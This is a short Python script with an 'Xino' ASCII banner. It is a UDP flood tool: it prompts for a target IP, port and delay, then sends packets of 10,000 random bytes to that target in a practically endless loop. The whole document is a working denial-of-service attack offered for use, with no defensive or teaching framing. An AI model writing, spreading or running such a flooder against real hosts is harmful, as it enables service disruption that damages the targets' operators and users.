import socket, random, time
from pystyle import Colors, Colorate


import colorama
from colorama import Back, Fore, Style

print(Colorate.Horizontal(Colors.blue_to_red,"""

 /$$   /$$ /$$                    
| $$  / $$|__/                    
|  $$/ $$/ /$$ /$$$$$$$   /$$$$$$ 
 \  $$$$/ | $$| $$__  $$ /$$__  $$
  >$$  $$ | $$| $$  \ $$| $$  \ $$
 /$$/\  $$| $$| $$  | $$| $$  | $$
| $$  \ $$| $$| $$  | $$|  $$$$$$/
|__/  |__/|__/|__/  |__/ \______/ 
                                  
                                  
                                  

""",1))








s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


ip = input(Fore.RED + 'Enter Target IP: ')
port = int(input ('Enter Target Port: '))
sleep = float(input('Sleep: '))


s.connect((ip, port))


for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print (f'Send: {i}', end='\r')
    time.sleep(sleep)